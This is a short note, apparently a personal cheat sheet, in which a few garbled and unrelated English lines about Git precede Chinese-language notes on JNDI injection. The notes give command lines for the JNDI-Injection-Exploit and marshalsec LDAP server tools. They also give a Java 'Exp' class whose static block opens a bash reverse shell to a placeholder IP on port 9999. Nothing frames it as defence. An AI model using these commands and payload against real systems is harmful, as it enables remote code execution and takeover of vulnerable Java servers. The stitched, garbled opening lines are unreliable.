Git is a version control sysrem.
Git is free software.
wher true
will be not
branch modify





JNDI注入工具：

JNDI-Injection-Exploit

```
java -jar JNDI-Injection-Exploit -C "command" -A 127.0.0.1
```



marshalsec-jar

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefserver "http://ip/#EXp" 1389
```

需要准备包含恶意代码的exp

```java
import java.lang.Runtime;
import java.lang.Process;

public class Exp {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/ip/9999 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            //do nothing
        }
    }
}
```

